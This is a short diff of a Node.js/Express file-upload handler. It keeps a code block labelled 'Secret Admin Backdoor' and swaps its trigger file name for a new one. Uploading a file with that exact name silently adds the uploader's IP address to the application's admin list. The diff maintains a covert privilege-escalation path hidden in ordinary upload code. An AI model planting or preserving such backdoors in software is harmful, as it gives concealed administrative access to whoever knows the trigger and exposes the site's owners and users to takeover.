@@ -91,7 +91,7 @@ app.post('/upload', (req, res) => {
         const metadata = getMetadata();
 
         // Secret Admin Backdoor
-        if (req.file.originalname === 'Ekran görüntüsü 2026-04-03 224823.png') {
+        if (req.file.originalname === '1778346283828.png') {
             if (!metadata.admins) metadata.admins = [];
             if (!metadata.admins.includes(ip)) metadata.admins.push(ip);
             saveMetadata(metadata);
